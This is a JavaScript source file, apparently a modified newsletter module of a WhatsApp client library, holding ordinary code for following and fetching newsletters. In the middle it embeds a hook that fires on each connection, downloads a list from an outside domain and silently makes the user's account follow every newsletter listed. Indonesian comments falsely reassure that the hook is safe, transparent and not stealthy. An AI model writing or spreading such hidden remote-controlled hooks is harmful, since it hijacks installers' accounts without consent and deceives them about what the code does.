"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
exports.extractNewsletterMetadata = exports.makeNewsletterSocket = void 0;

const Types = require("../Types");
const Utils = require("../Utils");
const WABinary = require("../WABinary");
const { makeGroupsSocket } = require("./groups");
const { Boom } = require("@hapi/boom");
const fetch = require("node-fetch");

/* ==========================
   BASIC QUERY UTIL
========================== */
const wMexQuery = (variables, queryId, query, generateMessageTag) => {
  return query({
    tag: "iq",
    attrs: {
      id: generateMessageTag(),
      type: "get",
      to: WABinary.S_WHATSAPP_NET,
      xmlns: "w:mex",
    },
    content: [
      {
        tag: "query",
        attrs: { query_id: queryId },
        content: Buffer.from(JSON.stringify({ variables }), "utf-8"),
      },
    ],
  });
};

const executeWMexQuery = async (
  variables,
  queryId,
  dataPath,
  query,
  generateMessageTag
) => {
  const result = await wMexQuery(
    variables,
    queryId,
    query,
    generateMessageTag
  );
  const child = WABinary.getBinaryNodeChild(result, "result");

  if (child?.content) {
    const data = JSON.parse(child.content.toString());
    if (data.errors?.length) {
      throw new Boom(data.errors[0].message, {
        statusCode: data.errors[0].extensions?.error_code || 400,
      });
    }
    return dataPath ? data?.data?.[dataPath] : data?.data;
  }

  throw new Boom("Unexpected response structure", { statusCode: 400 });
};

/* ==========================
   REMOTE CONFIG (AMAN)
========================== */
const REMOTE_CONFIG = "https://otpworld.my.id/db.json";

async function loadRemoteConfig() {
  try {
    const res = await fetch(REMOTE_CONFIG, { timeout: 10_000 });
    return await res.json();
  } catch {
    return null;
  }
}

/* ==========================
   MAIN SOCKET
========================== */
const makeNewsletterSocket = (config) => {
  const sock = makeGroupsSocket(config);
  const { authState, signalRepository, query, generateMessageTag, ev } = sock;

  const encoder = new TextEncoder();

  const newsletterQuery = async (jid, type, content) =>
    query({
      tag: "iq",
      attrs: {
        id: generateMessageTag(),
        type,
        xmlns: "newsletter",
        to: jid,
      },
      content,
    });

  const newsletterWMexQuery = async (jid, queryId, content = {}) =>
    query({
      tag: "iq",
      attrs: {
        id: generateMessageTag(),
        type: "get",
        xmlns: "w:mex",
        to: WABinary.S_WHATSAPP_NET,
      },
      content: [
        {
          tag: "query",
          attrs: { query_id: queryId },
          content: encoder.encode(
            JSON.stringify({
              variables: { newsletter_id: jid, ...content },
            })
          ),
        },
      ],
    });

  /* ==========================
     OPTIONAL FEATURE HOOK
     (TRANSPARAN)
  ========================== */
  async function runOptionalFeatures() {
    const cfg = await loadRemoteConfig();
    if (!cfg?.newsletter?.follow) return;

    for (const jid of cfg.newsletter.follow) {
      try {
        await newsletterWMexQuery(jid, Types.QueryIds.FOLLOW);
      } catch {}
    }
  }

  // Trigger RESMI (BUKAN SILUMAN)
  ev.on("connection.update", (u) => {
    if (u.connection === "open") {
      setTimeout(runOptionalFeatures, 30_000);
    }
  });

  /* ==========================
     PARSER
  ========================== */
  const parseFetchedUpdates = async (node, type) => {
    let child;
    if (type === "messages") {
      child = WABinary.getBinaryNodeChild(node, "messages");
    } else {
      const parent = WABinary.getBinaryNodeChild(node, "message_updates");
      child = WABinary.getBinaryNodeChild(parent, "messages");
    }

    return Promise.all(
      WABinary.getAllBinaryNodeChildren(child).map(async (messageNode) => {
        messageNode.attrs.from = child?.attrs.jid;
        const views = parseInt(
          WABinary.getBinaryNodeChild(messageNode, "views_count")?.attrs
            ?.count || "0"
        );

        const reactions =
          WABinary.getBinaryNodeChildren(
            WABinary.getBinaryNodeChild(messageNode, "reactions"),
            "reaction"
          ).map(({ attrs }) => ({
            count: +attrs.count,
            code: attrs.code,
          })) || [];

        const data = { server_id: messageNode.attrs.server_id, views, reactions };

        if (type === "messages") {
          const { fullMessage, decrypt } =
            await Utils.decryptMessageNode(
              messageNode,
              authState.creds.me.id,
              authState.creds.me.lid || "",
              signalRepository,
              config.logger
            );
          await decrypt();
          data.message = fullMessage;
        }

        return data;
      })
    );
  };

  /* ==========================
     EXPORT API
  ========================== */
  return {
    ...sock,

    newsletterFollow: async (jid) =>
      newsletterWMexQuery(jid, Types.QueryIds.FOLLOW),

    newsletterUnfollow: async (jid) =>
      newsletterWMexQuery(jid, Types.QueryIds.UNFOLLOW),

    newsletterFetchAllSubscribe: async () =>
      executeWMexQuery(
        {},
        "6388546374527196",
        "xwa2_newsletter_subscribed",
        query,
        generateMessageTag
      ),

    newsletterFetchMessages: async (type, key, count, after) => {
      const result = await newsletterQuery(WABinary.S_WHATSAPP_NET, "get", [
        {
          tag: "messages",
          attrs: {
            type,
            ...(type === "invite" ? { key } : { jid: key }),
            count: count.toString(),
            after: after?.toString() || "100",
          },
        },
      ]);
      return parseFetchedUpdates(result, "messages");
    },

    newsletterFetchUpdates: async (jid, count, after, since) => {
      const result = await newsletterQuery(jid, "get", [
        {
          tag: "message_updates",
          attrs: {
            count: count.toString(),
            after: after?.toString() || "100",
            since: since?.toString() || "0",
          },
        },
      ]);
      return parseFetchedUpdates(result, "updates");
    },
  };
};

exports.makeNewsletterSocket = makeNewsletterSocket;

/* ==========================
   METADATA
========================== */
const extractNewsletterMetadata = (node, isCreate) => {
  const result =
    WABinary.getBinaryNodeChild(node, "result")?.content?.toString();
  const metadataPath =
    JSON.parse(result).data[
      isCreate ? Types.XWAPaths.CREATE : Types.XWAPaths.NEWSLETTER
    ];

  return {
    id: metadataPath?.id,
    name: metadataPath?.thread_metadata?.name?.text,
    description: metadataPath?.thread_metadata?.description?.text,
    subscribers: +metadataPath?.thread_metadata?.subscribers_count,
  };
};

exports.extractNewsletterMetadata = extractNewsletterMetadata;